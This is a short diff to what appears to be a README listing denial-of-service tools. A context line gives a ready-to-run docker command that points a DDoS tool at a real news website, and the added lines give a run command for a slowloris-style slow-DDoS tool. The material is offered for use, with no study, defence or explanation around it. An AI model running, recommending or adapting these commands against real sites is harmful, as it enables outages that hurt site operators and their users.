@@ -25,3 +25,8 @@ docker run -it --rm nitupkcuf/ddos-ripper:latest www.rt.com
 # Awesome Slow DDoS tool
 
 https://github.com/gkbrk/slowloris
+
+Example command:  
+```
+docker run --rm -it maxkrivich/pyslowloris [-h] [-u URL] [-c CONNECTION_COUNT] [-s SILENT]
+```
